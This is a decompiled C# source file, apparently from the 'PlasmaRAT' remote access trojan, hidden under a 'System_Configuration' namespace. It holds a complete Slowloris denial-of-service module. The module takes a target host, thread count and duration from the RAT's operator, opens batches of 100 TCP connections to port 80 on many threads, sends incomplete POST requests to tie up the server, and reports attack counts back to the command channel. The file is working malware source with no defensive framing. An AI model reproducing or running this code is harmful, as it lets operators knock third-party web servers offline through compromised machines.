using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace System_Configuration
{
	// Token: 0x0200000A RID: 10
	[StandardModule]
	public sealed class Slowloris
	{
		// Token: 0x06000023 RID: 35 RVA: 0x00003A20 File Offset: 0x00001C20
		public static void StartSlowloris(string Host, int Threadsto, int Time, string data)
		{
			if (!Slowloris.AttackRunning)
			{
				Slowloris.AttackRunning = true;
				Slowloris.HostToAttack = Host;
				Slowloris.PostDATA = data;
				Slowloris.ThreadstoUse = Threadsto;
				Slowloris.TimetoAttack = Time;
				if (Slowloris.HostToAttack.Contains("http://"))
				{
					Slowloris.HostToAttack = Slowloris.HostToAttack.Replace("http://", string.Empty);
				}
				if (Slowloris.HostToAttack.Contains("www."))
				{
					Slowloris.HostToAttack = Slowloris.HostToAttack.Replace("www.", string.Empty);
				}
				if (Slowloris.HostToAttack.Contains("/"))
				{
					Slowloris.HostToAttack = Slowloris.HostToAttack.Replace("/", string.Empty);
				}
				Slowloris.Threads = new Thread[Threadsto - 1 + 1];
				PlasmaRAT.TalktoChannel("Slowloris Attack on " + Slowloris.HostToAttack + " started!", "");
				int num = 0;
				int num2 = Threadsto - 1;
				for (int i = num; i <= num2; i++)
				{
					Slowloris.Threads[i] = new Thread(new ThreadStart(Slowloris.DoWork));
					Slowloris.Threads[i].IsBackground = true;
					Slowloris.Threads[i].Start();
				}
			}
			else
			{
				PlasmaRAT.TalktoChannel("A Slowloris Attack is Already Running on " + Slowloris.HostToAttack, "");
			}
		}

		// Token: 0x06000024 RID: 36 RVA: 0x00003B68 File Offset: 0x00001D68
		private static void lol()
		{
			Slowloris.ThreadsEnded = Operators.AddObject(Slowloris.ThreadsEnded, 1);
			if (Operators.ConditionalCompareObjectEqual(Slowloris.ThreadsEnded, Slowloris.ThreadstoUse, false))
			{
				Slowloris.ThreadsEnded = 0;
				Slowloris.ThreadstoUse = 0;
				Slowloris.AttackRunning = false;
				PlasmaRAT.TalktoChannel("Slowloris Attack on " + Slowloris.HostToAttack + " finished successfully. Attacks Sent: " + Slowloris.attacks.ToString(), "");
				Slowloris.attacks = 0;
			}
		}

		// Token: 0x06000025 RID: 37 RVA: 0x00003BE8 File Offset: 0x00001DE8
		public static void StopSlowloris()
		{
			if (Slowloris.AttackRunning)
			{
				int num = 0;
				int num2 = Slowloris.ThreadstoUse - 1;
				for (int i = num; i <= num2; i++)
				{
					try
					{
						Slowloris.Threads[i].Abort();
					}
					catch (Exception ex)
					{
					}
				}
				Slowloris.AttackRunning = false;
				PlasmaRAT.TalktoChannel("Slowloris Attack on " + Slowloris.HostToAttack + " aborted successfully. Attacks Sent: " + Slowloris.attacks.ToString(), "");
				Slowloris.attacks = 0;
			}
			else
			{
				PlasmaRAT.TalktoChannel("No Slowloris Attack is Running!", "");
			}
		}

		// Token: 0x06000026 RID: 38 RVA: 0x00003C84 File Offset: 0x00001E84
		private static void DoWork()
		{
			try
			{
				Socket[] array = new Socket[100];
				TimeSpan t = TimeSpan.FromSeconds((double)Slowloris.TimetoAttack);
				Stopwatch stopwatch = Stopwatch.StartNew();
				while (stopwatch.Elapsed < t)
				{
					try
					{
						new WebClient();
						int num = 0;
						do
						{
							array[num] = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
							array[num].Connect(Dns.GetHostAddresses(Slowloris.HostToAttack), 80);
							array[num].Send(Encoding.Default.GetBytes("POST / HTTP/1.1\r\nHost: " + Slowloris.HostToAttack.ToString() + "\r\nContent-length: 5235\r\n\r\n"), SocketFlags.None);
							Slowloris.attacks++;
							num++;
						}
						while (num <= 99);
						int num2 = 0;
						do
						{
							array[num2].Close();
							num2++;
						}
						while (num2 <= 99);
					}
					catch (Exception ex)
					{
					}
				}
			}
			catch (Exception ex2)
			{
			}
			Slowloris.lol();
		}

		// Token: 0x0400002C RID: 44
		private static object ThreadsEnded = 0;

		// Token: 0x0400002D RID: 45
		private static string PostDATA;

		// Token: 0x0400002E RID: 46
		private static string HostToAttack;

		// Token: 0x0400002F RID: 47
		private static int TimetoAttack;

		// Token: 0x04000030 RID: 48
		private static int ThreadstoUse;

		// Token: 0x04000031 RID: 49
		private static Thread[] Threads;

		// Token: 0x04000032 RID: 50
		private static bool AttackRunning = false;

		// Token: 0x04000033 RID: 51
		private static int attacks = 0;
	}
}
